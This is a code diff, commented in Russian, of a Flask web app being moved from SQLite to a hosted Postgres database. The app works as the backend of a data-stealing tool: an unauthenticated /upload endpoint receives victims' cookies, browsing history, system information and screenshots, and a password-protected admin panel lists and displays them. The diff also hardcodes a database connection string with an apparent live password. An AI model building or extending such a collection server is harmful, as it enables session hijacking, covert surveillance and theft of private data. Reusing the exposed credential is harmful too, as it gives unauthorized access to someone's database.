@@ -1,7 +1,8 @@
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, render_template
 from flask_httpauth import HTTPBasicAuth
-import sqlite3, os, json, base64
+import psycopg2, json, base64
 from datetime import datetime
+import os
 
 app = Flask(__name__)
 auth = HTTPBasicAuth()
@@ -14,68 +15,70 @@ def verify(username, password):
         return username
     return None
 
-DB_FILE = "database.db"
+# URL подключения к Neon
+DB_URL = os.getenv("NEON_URL", "postgresql://neondb_owner:npg_FK3RL4ZGAXin@ep-frosty-wildflower-af3ua5fw-pooler.c-2.us-west-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require")
 
-# Инициализация базы данных
+def get_conn():
+    return psycopg2.connect(DB_URL)
+
+# Инициализация таблицы
 def init_db():
-    if not os.path.exists(DB_FILE):
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute('''CREATE TABLE users (
-                        id INTEGER PRIMARY KEY AUTOINCREMENT,
-                        username TEXT,
-                        cookies TEXT,
-                        history TEXT,
-                        system_info TEXT,
-                        screenshot BLOB,
-                        timestamp TEXT
-                    )''')
-        conn.commit()
-        conn.close()
+    conn = get_conn()
+    cur = conn.cursor()
+    cur.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            id SERIAL PRIMARY KEY,
+            username TEXT,
+            cookies JSONB,
+            history JSONB,
+            system_info JSONB,
+            screenshot BYTEA,
+            timestamp TIMESTAMP
+        )
+    ''')
+    conn.commit()
+    cur.close()
+    conn.close()
 
 init_db()
 
-# Преобразование строки из БД в словарь
 def dict_from_row(row):
     if not row:
         return None
     return {
         "id": row[0],
         "username": row[1],
-        "cookies": json.loads(row[2]) if row[2] else [],
-        "history": json.loads(row[3]) if row[3] else [],
-        "system_info": json.loads(row[4]) if row[4] else {},
+        "cookies": row[2] or [],
+        "history": row[3] or [],
+        "system_info": row[4] or {},
         "screenshot": row[5],
-        "timestamp": row[6]
+        "timestamp": row[6].strftime("%Y-%m-%d %H:%M:%S") if row[6] else ""
     }
 
-# Админка
 @app.route('/')
 @auth.login_required
 def admin_panel():
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC")
-    rows = c.fetchall()
+    conn = get_conn()
+    cur = conn.cursor()
+    cur.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC")
+    rows = cur.fetchall()
+    cur.close()
     conn.close()
-    users = [{"id": r[0], "username": r[1], "timestamp": r[2]} for r in rows]
+    users = [{"id": r[0], "username": r[1], "timestamp": r[2].strftime("%Y-%m-%d %H:%M:%S") if r[2] else ""} for r in rows]
     return render_template('admin.html', users=users)
 
-# Просмотр пользователя
 @app.route('/user/<int:user_id>')
 @auth.login_required
 def view_user(user_id):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM users WHERE id=?", (user_id,))
-    row = c.fetchone()
+    conn = get_conn()
+    cur = conn.cursor()
+    cur.execute("SELECT * FROM users WHERE id=%s", (user_id,))
+    row = cur.fetchone()
+    cur.close()
     conn.close()
     user = dict_from_row(row)
-    if not user:
-        return "User not found", 404
     return render_template('user_detail.html', user=user)
 
-# Загрузка данных
 @app.route('/upload', methods=['POST'])
 def upload_data():
     data = request.json
@@ -85,19 +88,20 @@ def upload_data():
     system_info = json.dumps(data.get('systemInfo', {}))
     screenshot = data.get('screenshot', None)
     if screenshot:
-        # Декодирование base64 без префикса
-        screenshot = base64.b64decode(screenshot.split(',')[-1])
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        screenshot = base64.b64decode(screenshot.split(',')[1])
+    timestamp = datetime.now()
 
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute(
-        "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
+    conn = get_conn()
+    cur = conn.cursor()
+    cur.execute(
+        "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (%s, %s, %s, %s, %s, %s)",
         (username, cookies, history, system_info, screenshot, timestamp)
     )
     conn.commit()
+    cur.close()
     conn.close()
     return {'status': 'ok'}
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
